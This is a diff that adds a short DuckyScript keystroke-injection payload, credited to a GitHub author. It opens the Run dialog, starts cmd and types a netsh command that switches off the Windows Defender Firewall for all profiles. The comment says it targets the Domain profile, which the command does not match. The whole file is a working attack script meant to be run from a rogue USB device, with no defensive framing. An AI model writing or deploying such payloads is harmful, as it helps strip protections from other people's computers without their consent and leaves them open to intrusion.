@@ -1,0 +1,15 @@
+
+REM Author: https://github.com/NovaCynical
+
+REM Disables Windows Defender Firewall for Domain, using Command Prompt
+REM Must be running cmd as Admin
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING netsh advfirewall set allprofiles state off
+ENTER
+DELAY 1000
